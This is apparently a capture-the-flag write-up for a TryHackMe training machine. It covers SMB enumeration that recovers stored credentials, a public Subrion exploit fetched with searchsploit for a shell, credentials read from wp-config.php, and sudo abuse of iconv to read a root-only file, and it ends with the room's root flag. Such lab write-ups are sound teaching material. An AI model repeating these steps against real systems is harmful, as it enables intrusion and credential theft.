![thumbnail](https://github.com/Debang5hu/ctf-writeups/assets/114200360/ad8c0a90-7994-4743-8af1-4612f8f21906)  

Machine: https://tryhackme.com/room/techsupp0rt1  

OS: Ubuntu (Linux)  

WEB TECHNOLOGY:  Wordpress(5.7.2),Subrion,Mysql,php

As usual start by exporting the IP to local variable  

```
export IP='10.10.228.84'
```  

------------------------------------------------------------------------------------------------  
Perform a Nmap scan:  

# Scanning and Reconnaisance  

NMAP RESULT:  

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
| smb2-time: 
|   date: 2023-12-26T06:33:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2023-12-26T12:03:54+05:30
```

------------------------------------------------------------------------------------------  

PORTS/Services running:  

22 --> ssh  
80 --> http  
139,445 --> smb  

---------------------------------------------------------------------------------------------  
# ENUMERATION:  

HTTP (80):  
 
/test  
/wordpress --> /wp-admin  

Nothing Interesting Directory were found  

------------------------------------------------------------------------------------------------

SMB (139,445):  

![Screenshot_2023-12-26_15_27_28](https://github.com/Debang5hu/ctf-writeups/assets/114200360/89026d90-6262-4165-8d8b-8d5c5026f1df)  

```
smbmap -H $IP
```  

"websvr" has Read permission  

enumerating it:  

```
smbclient \\\\$IP\\websvr
```  

Found a text file named 'enter.txt' get the file in your device  

```
get enter.txt
```  

the file contains the username and password(encrypted) and gives the hint where to login with the provided credentials  

head to the site:  $IP/subrion/panel  

-----------------------------------------------------------------------------------------------------------------------------------
# Getting a shell  

Now, I found a python exploit to get the shell (found it using searchsploit)  

```
searchsploit subrion
```  

Get the exploit to the current directory by  

```
searchsploit -m php/webapps/49876.py
```  

Now run the exploit to get the shell and find the username and password from /home and /var/www/html/wordpress/wp-config.php  file  

After getting the Credentials SSH into the machine  

```
ssh scamsite@$IP
```  

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Priviledge Escallation  

check the sudo permissions  
  
```
sudo -l
```  

Now use 'gtfobins' for escalling the priviledge  

Read the Root flag:  

```
FILE='/root/root.txt'
```  

```
/usr/bin/iconv -f 8859_1 -t 8859_1 "$FILE"
```  


Root Flag: 851b8233a8c09400ec30651bd1529bf1ed02790b  


